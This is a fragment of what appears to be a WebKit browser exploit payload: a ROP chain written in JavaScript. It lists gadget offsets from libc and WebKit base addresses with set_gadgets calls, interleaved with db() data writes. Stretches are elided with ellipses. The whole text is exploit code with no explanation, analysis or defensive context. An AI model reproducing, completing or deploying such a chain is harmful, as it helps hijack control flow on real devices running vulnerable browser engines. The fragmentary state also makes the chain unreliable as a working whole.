...
db([0,0]); 
set_gadgets([
libc_base+191168,libc_base+793877,ropchain+192416,webkit_base+7438103,libc_base+793877,ropchain+192480,webkit_base+7438103,libc_base+50775,libc_base+793877,ropchain+192432,webkit_base+7438103,libc_base+882884,libc_base+793877,ropchain+192448,webkit_base+7438103,webkit_base+3750700 
]);
db([0,0]); 
set_gadget(libc_base+792472,); 
db([0,0]); 
...
db([0,0]); 
set_gadgets([
webkit_base+6227286,libc_base+793877,ropchain+202600,webkit_base+7438103,webkit_base+1786005,libc_base+793877,ropchain+202616,webkit_base+7438103,libc_base+759626,libc_base+792472 
]);
db([0,0]); 
set_gadget(libc_base+206806,); 
db([0,0]); 
...
db([0,0]); 
set_gadgets([
libc_base+191168,libc_base+793877,ropchain+202880,webkit_base+7438103,libc_base+882884,libc_base+793877,ropchain+202896,webkit_base+7438103,libc_base+759626,libc_base+792472 
]);
db([0,0]); 
set_gadget(libc_base+206806,); 
db([0,0]); 
...
db([0,0]); 
set_gadgets([
webkit_base+6227286,libc_base+793877,ropchain+208952,webkit_base+7438103,webkit_base+1786005,libc_base+793877,ropchain+208968,webkit_base+7438103,libc_base+759626,libc_base+792472 
]);
db([0,0]); 
set_gadget(libc_base+206806,); 
db([0,0]); 
...
db([8,0]); 
set_gadgets([
libc_base+248252,libc_base+471355,libc_base+811575,ropchain+213296,libc_base+882884,libc_base+793877 
]);
db([4294967288,4294967295]); 
set_gadgets([
...
db([128,0]); 
set_gadgets([
libc_base+248252,libc_base+50775,libc_base+793877,ropchain+213288,webkit_base+7438103,libc_base+811575 
]);
db([0,0]); 
set_gadget(libc_base+793877,); 
db([208,0]); 
